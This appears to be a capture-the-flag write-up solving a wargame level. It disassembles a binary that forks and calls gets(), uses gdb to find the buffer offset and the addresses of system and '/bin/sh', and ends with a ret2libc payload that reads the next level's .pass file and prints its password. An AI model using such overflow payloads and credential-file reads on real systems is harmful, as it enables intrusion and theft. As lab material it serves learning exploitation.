important part of the elf:

    [...]
    0x080486d6 <+14>:    call   0x8048550 <fork@plt>
    0x080486db <+19>:    mov    %eax,0xac(%esp)
    [...]
    0x08048709 <+65>:    cmpl   $0x0,0xac(%esp)
    0x08048711 <+73>:    jne    0x8048769 <main+161>
    [...]
    0x08048757 <+143>:   lea    0x20(%esp),%eax
    0x0804875b <+147>:   mov    %eax,(%esp)
    0x0804875e <+150>:   call   0x80484b0 <gets@plt>
    0x08048763 <+155>:   jmp    0x804881a <main+338>
    0x08048768 <+160>:   nop
    0x08048769 <+161>:   lea    0x1c(%esp),%eax
    0x0804876d <+165>:   mov    %eax,(%esp)
    0x08048770 <+168>:   call   0x80484f0 <wait@plt>
    [...]

we see:
- a fork
- a gets functions at the end of the child that can override the return address
- a wait functions in the parent that will wait for the child to finish

to exploit this, we have to know the offset between the buffer and the return address, and the address of the system function, and the address of the string "/bin/sh"

to help to find answers to these questions, we can use gdb and the `set follow-fork-mode child` command to follow the child process

```bash
$ gdb level04
[...]
$ set follow-fork-mode child
$ b *main+150
Breakpoint 1 at 0x804875e
$ b *main+168
Breakpoint 2 at 0x8048770
$ r
[...]
Thread 2.1 "level04" hit Breakpoint 1, 0x0804875e in main ()
$ i r
[...]
esp            0xffffcd60          0xffffcd60
ebp            0xffffce18          0xffffce18
[...]
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc mapping
[...]
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
[...]
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
```

calculate the offset between the buffer and the return address:

esp - ebp: `0xffffcd60 - 0xffffce18 = 0xb8` (184)

we know that the buffer for the gets is: `0x20` (32)

the is offset: `0xb8 - 0x20 = 0x98` (152) and we can add 4 bytes for the saved ebp

we can now write the exploit:

```bash
$ (python -c 'print("A"*156 + "\xd0\xae\xe6\xf7" + "\x90"*4 + "\xec\x97\xf8\xf7")' && echo cat /home/users/level05/.pass) | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```